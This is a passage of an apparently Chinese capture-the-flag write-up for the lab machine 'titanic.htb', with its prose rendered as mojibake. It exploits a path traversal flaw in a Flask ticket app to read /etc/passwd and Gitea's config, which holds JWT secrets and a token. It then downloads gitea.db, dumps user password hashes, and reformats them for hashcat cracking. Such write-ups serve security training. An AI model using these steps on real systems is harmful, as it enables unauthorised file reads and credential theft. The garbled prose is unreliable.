src="https://img.dkdun.cn/v1/2025/12/af3ec6ee5d882d00.png"></p><p>å‘ç°äº† giteaï¼Œç„¶åç‚¹å‡» <code>Explore</code>  æ‰¾åˆ°äº†ä¸€äº›ç”¨æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/20552900753fbe8f.png"></p><p>åªæœ‰ <code>developer</code> ç”¨æˆ·é‡Œæœ‰æ–‡ä»¶ï¼Œä¸€ä¸ª <code>docker-config</code> å’Œä¸€ä¸ª <code>flask-app</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/533b8088f4935b23.png"></p><p>å†…å®¹å¦‚ä¸‹</p><p><img src="https://img.dkdun.cn/v1/2025/12/2dd9e9d8777690ed.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/a61f7ac027a75a78.png"></p><p>app.py æ–‡ä»¶æœ‰è·¯å¾„éå†æ¼æ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template, redirect, url_for, Response<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4<br><br>app = Flask(__name__)<br><br>TICKETS_DIR = <span class="hljs-string">&quot;tickets&quot;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(TICKETS_DIR):<br>    os.makedirs(TICKETS_DIR)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/book&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">book_ticket</span>():<br>    data = &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: request.form[<span class="hljs-string">&#x27;name&#x27;</span>],<br>        <span class="hljs-string">&quot;email&quot;</span>: request.form[<span class="hljs-string">&#x27;email&#x27;</span>],<br>        <span class="hljs-string">&quot;phone&quot;</span>: request.form[<span class="hljs-string">&#x27;phone&#x27;</span>],<br>        <span class="hljs-string">&quot;date&quot;</span>: request.form[<span class="hljs-string">&#x27;date&#x27;</span>],<br>        <span class="hljs-string">&quot;cabin&quot;</span>: request.form[<span class="hljs-string">&#x27;cabin&#x27;</span>]<br>    &#125;<br><br>    ticket_id = <span class="hljs-built_in">str</span>(uuid4())<br>    json_filename = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ticket_id&#125;</span>.json&quot;</span><br>    json_filepath = os.path.join(TICKETS_DIR, json_filename)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_filepath, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> json_file:<br>        json.dump(data, json_file)<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;download_ticket&#x27;</span>, ticket=json_filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_ticket</span>():<br>    ticket = request.args.get(<span class="hljs-string">&#x27;ticket&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ticket:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Ticket parameter is required&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    json_filepath = os.path.join(TICKETS_DIR, ticket)<br><br>    <span class="hljs-keyword">if</span> os.path.exists(json_filepath):<br>        <span class="hljs-keyword">return</span> send_file(json_filepath, as_attachment=<span class="hljs-literal">True</span>, download_name=ticket)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Ticket not found&quot;</span>&#125;), <span class="hljs-number">404</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p><code>download_ticket</code> è·¯ç”±ç›´æ¥ä½¿ç”¨ç”¨æˆ·ä¼ å…¥çš„ <code>ticket</code> å‚æ•°æ‹¼æ¥æ–‡ä»¶è·¯å¾„ï¼Œå¯ä»¥æ„é€ åƒ  <code>../../etc/passwd</code> è¿™æ ·çš„è·¯å¾„æ¥è¯»å–æ–‡ä»¶</p><p>è®¿é—®è¯•ä¸€ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://titanic.htb/download?ticket=../../../etc/passwd<br></code></pre></td></tr></table></figure><p>è¯»å–ä¸‹è½½çš„æ–‡ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y/Downloads]<br>â””â”€# cat  _.._.._etc_passwd<br><span class="hljs-function">root:<span class="hljs-title">x</span>:0:0:<span class="hljs-title">root</span>:/<span class="hljs-title">root</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">daemon:x</span>:1:1:<span class="hljs-title">daemon</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">bin:x</span>:2:2:<span class="hljs-title">bin</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">sys:x</span>:3:3:<span class="hljs-title">sys</span>:/<span class="hljs-title">dev</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">sync:x</span>:4:65534:<span class="hljs-title">sync</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">sync</span></span><br><span class="hljs-function"><span class="hljs-title">games:x</span>:5:60:<span class="hljs-title">games</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">games</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">man:x</span>:6:12:<span class="hljs-title">man</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">cache</span>/<span class="hljs-title">man</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">lp:x</span>:7:7:<span class="hljs-title">lp</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">lpd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">mail:x</span>:8:8:<span class="hljs-title">mail</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">mail</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">news:x</span>:9:9:<span class="hljs-title">news</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">news</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">uucp:x</span>:10:10:<span class="hljs-title">uucp</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">spool</span>/<span class="hljs-title">uucp</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">proxy:x</span>:13:13:<span class="hljs-title">proxy</span>:/<span class="hljs-title">bin</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">www</span>-<span class="hljs-title">data:x</span>:33:33:<span class="hljs-title">www</span>-<span class="hljs-title">data</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">backup:x</span>:34:34:<span class="hljs-title">backup</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">backups</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">list:x</span>:38:38:<span class="hljs-title">Mailing</span> <span class="hljs-title">List</span> <span class="hljs-title">Manager</span>:/<span class="hljs-title">var</span>/<span class="hljs-title">list</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">irc:x</span>:39:39:<span class="hljs-title">ircd</span>:/<span class="hljs-title">run</span>/<span class="hljs-title">ircd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">gnats:x</span>:41:41:<span class="hljs-title">Gnats</span> <span class="hljs-title">Bug</span>-<span class="hljs-title">Reporting</span> <span class="hljs-title">System</span> (<span class="hljs-title">admin</span>):/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">gnats</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">nobody:x</span>:65534:65534:<span class="hljs-title">nobody</span>:/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">_apt:x</span>:100:65534::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">network:x</span>:101:102:<span class="hljs-title">systemd</span> <span class="hljs-title">Network</span> <span class="hljs-title">Management</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">resolve:x</span>:102:103:<span class="hljs-title">systemd</span> <span class="hljs-title">Resolver</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">messagebus:x</span>:103:104::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">systemd</span>-<span class="hljs-title">timesync:x</span>:104:105:<span class="hljs-title">systemd</span> <span class="hljs-title">Time</span> <span class="hljs-title">Synchronization</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">pollinate:x</span>:105:1::/<span class="hljs-title">var</span>/<span class="hljs-title">cache</span>/<span class="hljs-title">pollinate</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">sshd:x</span>:106:65534::/<span class="hljs-title">run</span>/<span class="hljs-title">sshd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">syslog:x</span>:107:113::/<span class="hljs-title">home</span>/<span class="hljs-title">syslog</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">uuidd:x</span>:108:114::/<span class="hljs-title">run</span>/<span class="hljs-title">uuidd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">tcpdump:x</span>:109:115::/<span class="hljs-title">nonexistent</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">tss:x</span>:110:116:<span class="hljs-title">TPM</span> <span class="hljs-title">software</span> <span class="hljs-title">stack</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">tpm</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">landscape:x</span>:111:117::/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">landscape</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">fwupd</span>-<span class="hljs-title">refresh:x</span>:112:118:<span class="hljs-title">fwupd</span>-<span class="hljs-title">refresh</span> <span class="hljs-title">user</span>,,,:/<span class="hljs-title">run</span>/<span class="hljs-title">systemd</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">usbmux:x</span>:113:46:<span class="hljs-title">usbmux</span> <span class="hljs-title">daemon</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">usbmux</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">developer:x</span>:1000:1000:<span class="hljs-title">developer</span>:/<span class="hljs-title">home</span>/<span class="hljs-title">developer</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">lxd:x</span>:999:100::/<span class="hljs-title">var</span>/<span class="hljs-title">snap</span>/<span class="hljs-title">lxd</span>/<span class="hljs-title">common</span>/<span class="hljs-title">lxd</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br><span class="hljs-function"><span class="hljs-title">dnsmasq:x</span>:114:65534:<span class="hljs-title">dnsmasq</span>,,,:/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">misc</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">nologin</span></span><br><span class="hljs-function"><span class="hljs-title">_laurel:x</span>:998:998::/<span class="hljs-title">var</span>/<span class="hljs-title">log</span>/<span class="hljs-title">laurel</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">false</span></span><br></code></pre></td></tr></table></figure><p>æœ‰ <code>developer</code>  ç”¨æˆ·</p><p><code>docker-compose.yml</code> æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gitea:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">gitea/gitea</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">gitea</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;127.0.0.1:3000:3000&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;127.0.0.1:2222:22&quot;</span>  <span class="hljs-comment"># Optional for SSH access</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">/home/developer/gitea/data:/data</span> <span class="hljs-comment"># Replace with your path</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">USER_UID=1000</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">USER_GID=1000</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1752ede4d753a45e.png"></p><p>é€šè¿‡ <code>gitea</code> çš„æ‰‹å†Œæ‰¾åˆ°é…ç½®æ–‡ä»¶è·¯å¾„ï¼Œç»“åˆ <code>docker-compose.yml</code>  ä¸­çš„æ–‡ä»¶è·¯å¾„ä¸‹è½½é…ç½®æ–‡ä»¶</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini<br></code></pre></td></tr></table></figure><p>è¯»å–é…ç½®æ–‡ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y/Downloads]<br>â””â”€# cat _.._.._home_developer_gitea_data_gitea_conf_app.ini<br>APP_NAME = Gitea: Git with a cup of tea<br>RUN_MODE = prod<br>RUN_USER = git<br>WORK_PATH = /data/gitea<br><br>[repository]<br>ROOT = /data/git/repositories<br><br>[repository.local]<br>LOCAL_COPY_PATH = /data/gitea/tmp/local-repo<br><br>[repository.upload]<br>TEMP_PATH = /data/gitea/uploads<br><br>[server]<br>APP_DATA_PATH = /data/gitea<br>DOMAIN = gitea.titanic.htb<br>SSH_DOMAIN = gitea.titanic.htb<br>HTTP_PORT = <span class="hljs-number">3000</span><br>ROOT_URL = http://gitea.titanic.htb/<br>DISABLE_SSH = false<br>SSH_PORT = <span class="hljs-number">22</span><br>SSH_LISTEN_PORT = <span class="hljs-number">22</span><br>LFS_START_SERVER = true<br>LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4<br>OFFLINE_MODE = true<br><br>[database]<br><span class="hljs-built_in">PATH</span> = /data/gitea/gitea.db<br>DB_TYPE = sqlite3<br>HOST = localhost:<span class="hljs-number">3306</span><br>NAME = gitea<br>USER = root<br>PASSWD =<br>LOG_SQL = false<br>SCHEMA =<br>SSL_MODE = disable<br><br>[indexer]<br>ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve<br><br>[session]<br>PROVIDER_CONFIG = /data/gitea/sessions<br>PROVIDER = file<br><br>[picture]<br>AVATAR_UPLOAD_PATH = /data/gitea/avatars<br>REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars<br><br>[attachment]<br><span class="hljs-built_in">PATH</span> = /data/gitea/attachments<br><br>[log]<br><span class="hljs-built_in">MODE</span> = console<br>LEVEL = info<br>ROOT_PATH = /data/gitea/log<br><br>[security]<br>INSTALL_LOCK = true<br>SECRET_KEY =<br>REVERSE_PROXY_LIMIT = <span class="hljs-number">1</span><br>REVERSE_PROXY_TRUSTED_PROXIES = *<br>INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8<br>PASSWORD_HASH_ALGO = pbkdf2<br><br>[service]<br>DISABLE_REGISTRATION = false<br>REQUIRE_SIGNIN_VIEW = false<br>REGISTER_EMAIL_CONFIRM = false<br>ENABLE_NOTIFY_MAIL = false<br>ALLOW_ONLY_EXTERNAL_REGISTRATION = false<br>ENABLE_CAPTCHA = false<br>DEFAULT_KEEP_EMAIL_PRIVATE = false<br>DEFAULT_ALLOW_CREATE_ORGANIZATION = true<br>DEFAULT_ENABLE_TIMETRACKING = true<br>NO_REPLY_ADDRESS = noreply.localhost<br><br>[lfs]<br><span class="hljs-built_in">PATH</span> = /data/git/lfs<br><br>[mailer]<br>ENABLED = false<br><br>[openid]<br>ENABLE_OPENID_SIGNIN = true<br>ENABLE_OPENID_SIGNUP = true<br><br>[cron.update_checker]<br>ENABLED = false<br><br>[repository.pull-request]<br>DEFAULT_MERGE_STYLE = merge<br><br>[repository.signing]<br>DEFAULT_TRUST_MODEL = committer<br><br>[oauth2]<br>JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5ccf2c79c20f6a7a.png"></p><p>æ‰¾åˆ°äº† <code>gitea.db</code> çš„è·¯å¾„ </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">PATH</span> = /data/gitea/gitea.db<br></code></pre></td></tr></table></figure><p>curl ä¸‹æ¥</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">curl --<span class="hljs-built_in">path</span>-as-is -o gitea.db http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢ä¸€ä¸‹æ•°æ®åº“å†…å®¹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/gitea]<br>â””â”€# sqlite3 gitea.db &quot;SELECT name, passwd, salt FROM user;&quot;<br>administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|<span class="hljs-number">2</span>d149e5fbd1b20cf31db3e3c6a28fc9b<br>developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|<span class="hljs-number">8</span>bf3e3452b78544f8bee9400d6936d34<br>joe|e8b6651ada9f663eb58fe9f91749e25ebb701ce68d8af03e41254d9b4cfa3a959db6dd4fe8b0928c4bfe0a2648fe0f7ccfc8|<span class="hljs-number">1626</span>a36ea942a7d1b34f06b23e2d89e7<br><span class="hljs-number">1</span>syn1|<span class="hljs-number">9</span>fbfa80ae243bacab37c5e10c2b8558f18bf3bc17b23d782a55d795143714e1ed87f9cc01422a6c5519e649a9e20783c7be9|bda65bd7bb76331c2076c23347cd156d<br>kilobyte|<span class="hljs-number">98</span>d6a67dd155352c962c26c0008412960e3130d64e1fd23514e2ae8059930457b05989e64eb6c5418b1f8bf6c27b47431ab8|<span class="hljs-number">216</span>d42075eef581be952be3a31bfd58d<br></code></pre></td></tr></table></figure><p>æŠŠå†…å®¹è½¬ä¸º hashcat èƒ½çˆ†ç ´çš„æ ¼å¼</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">sqlite3 gitea.db &quot;SELECT passwd, salt, name FROM user&quot; | awk -F &#x27;|&#x27; &#x27;&#123;<span class="hljs-built_in">cmd</span> = &quot;<span class="hljs-built_in">echo</span> -n &quot; $<span class="hljs-number">1</span> &quot; | xxd -r -p | base64&quot;; <span class="hljs-built_in">cmd</span> | getline digest; close(<span class="hljs-built_in">cmd</span>);<span class="hljs-built_in">cmd</span> = &quot;<span class="hljs-built_in">echo</span> -n &quot; $<span class="hljs-number">2</span> &quot; | xxd -r -p | base64&quot;; <span class="hljs-built_in">cmd</span> | getline salt; close(<span class="hljs-built_in">cmd</span>);printf &quot;<span class="hljs-variable">%s:sha256:50000:%</span>s:%s\n&quot;, $<span class="hljs-number">3</span>, salt, digest;&#125;&#x27; | tee gitea.hashes<br></code></pre></td></tr></table></figure><p>å¦‚ä¸‹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">administrator:<span class="hljs-title">sha256</span>:50000:<span class="hljs-title">LRSeX70bIM8x2z48aij8mw</span>==:<span class="hljs-title">y6IMz5J9OtBWe2gWFzLT</span>+8<span class="hljs-title">oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY</span>=</span><br><span class="hljs-function"><span class="hljs-title">developer:sha256</span>:50000:<span class="hljs-title">i</span>/<span class="hljs-title">PjRSt4VE</span>+<span class="hljs-title">L7pQA1pNtNA</span>==:5<span 